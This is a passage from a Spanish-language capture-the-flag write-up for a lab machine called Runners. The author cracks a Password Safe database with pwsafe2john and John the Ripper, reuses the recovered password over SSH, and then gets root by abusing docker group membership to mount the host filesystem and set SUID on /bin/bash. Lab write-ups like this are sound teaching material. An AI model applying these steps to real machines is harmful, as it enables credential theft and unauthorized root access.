drwxr-xr-x  4 root   root   4096 Nov 28  2024 .
drwxr-xr-x 23 root   root   4096 Nov 28  2024 ..
drwxr-xr-x  4 elliot elliot 4096 Nov 28  2024 elliot
drwxr-xr-x  3 ian    ian    4096 Nov 28  2024 ian
```

Hay un archivo con extensión **psafe3**:
```bash
ian@TheHackersLabs-Runners:~$ ls -la /home/elliot/
total 36
drwxr-xr-x 4 elliot elliot 4096 Nov 28  2024 .
drwxr-xr-x 4 root   root   4096 Nov 28  2024 ..
lrwxrwxrwx 1 root   root      9 Nov 28  2024 .bash_history -> /dev/null
-rw-r--r-- 1 elliot elliot  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 elliot elliot 3771 Mar 31  2024 .bashrc
drwx------ 3 elliot elliot 4096 Nov 28  2024 .cache
-rw------- 1 elliot elliot   20 Nov 27  2024 .lesshst
-rw-r--r-- 1 elliot elliot  904 Nov 28  2024 miscredenciales.psafe3
-rw-r--r-- 1 elliot elliot  807 Mar 31  2024 .profile
drwx------ 2 elliot elliot 4096 Nov 27  2024 .ssh
```

Investiguemos de qué se trata esta extensión:

| **Aplicación Password Safe** |
| :-------------: |
| *La extensión .psafe3 corresponde a archivos de base de datos de contraseñas creados por el programa Password Safe. Password Safe es una aplicación de código abierto para almacenar contraseñas de forma segura en una base de datos cifrada. Crea archivos .psafe3 que contienen: contraseñas, nombres de usuario, notas seguras, etc.* |

Entonces, encontramos una base de datos con contraseñas del **usuario elliot**.

Descarguemos ese archivo con **scp**:
```bash
scp ian@192.168.10.240:/home/elliot/miscredenciales.psafe3 .
ian@192.168.10.240's password: 
miscredenciales.psafe3
```

Obtengamos el hash de ese archivo con la herramienta **pwsafe2john**:
```bash
pwsafe2john miscredenciales.psafe3 > hash2
```

Y lo crackeamos con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
metallica        (miscredencial)     
1g 0:00:00:00 DONE (2025-07-30 09:51) 3.846g/s 11815p/s 11815c/s 11815C/s 123456..dangerous
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Bien, tenemos la contraseña y es la misma que se usó en el script del **contenedor de Docker**.

Para ver el contenido del archivo, necesitamos instalar **password safe** y lo haremos con el siguiente comando:
```bash
apt install passwordsafe
```

Ahora sí, ábrelo:
```bash
pwsafe miscredenciales.psafe3
```

Dale la contraseña:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura11.png">
</p>

Hay varias contraseñas del **usuario elliot** para algunas redes sociales:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura12.png">
</p>

Si seleccionamos cualquiera de esos datos, le damos clic derecho y le damos a la opción **Edit Entry**, podremos ver la contraseña.

La que nos interesa, es la del blog:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura13.png">
</p>

Esa contraseña nos servirá para ganar acceso como ese usuario vía **SSH**:
```bash
ssh elliot@192.168.10.240
elliot@192.168.10.240's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-49-generic x86_64)
...
Last login: Mon Dec  2 18:27:15 2024
elliot@TheHackersLabs-Runners:~$ whoami
elliot
```

### Escalando Privilegios Abusando de Grupo Docker {#docker}

Este usuario tampoco tendrá privilegios, pero si revisamos a qué grupos pertenece, encontraremos que está dentro del grupo **Docker**:
```bash
elliot@TheHackersLabs-Runners:~$ id
uid=1000(elliot) gid=1000(elliot) groups=1000(elliot),46(plugdev),110(docker)
```
Gracias a esto, tenemos una forma de escalar privilegios.

La encontraremos en la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank">GTFOBins: docker</a>

Utilizaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-runners/Captura14.png">
</p>

Ejecutémoslo sin él **sudo**:
```bash
elliot@TheHackersLabs-Runners:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
9824c27679d3: Pull complete 
Digest: sha256:4bcff63911fcb4448bd4fdacec207030997caf25e9bea4045fa6c8c44de311d1
Status: Downloaded newer image for alpine:latest
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@782203de7ba7:/# whoami
root
```
Excelente, creamos una montura completa de la raíz.

Esto nos permite realizar cambios en el contenedor que se verán reflejados en la máquina principal.

Entonces, podemos darle **permisos SUID** a la **Bash**.

Sal un momento del contendor y revisa los permisos de la **Bash**:
```bash
elliot@TheHackersLabs-Runners:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ejecuta el mismo comando para crear el contenedor de nuevo y dale los **permisos SUID** a la **Bash**:
```bash
root@9dce80bb4638:/# chmod u+s /bin/bash
root@9dce80bb4638:/# exit
exit
```

Una vez que salgas, revisa otra vez los permisos de la **Bash**:
```bash
elliot@TheHackersLabs-Runners:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Ya tiene **permisos SUID**.

Ejecuta la **Bash** con privilegios:
```bash
elliot@TheHackersLabs-Runners:~$ bash -p
bash-5.2# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
blog  blog.sql	docker-compose.yml  Dockerfile	root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
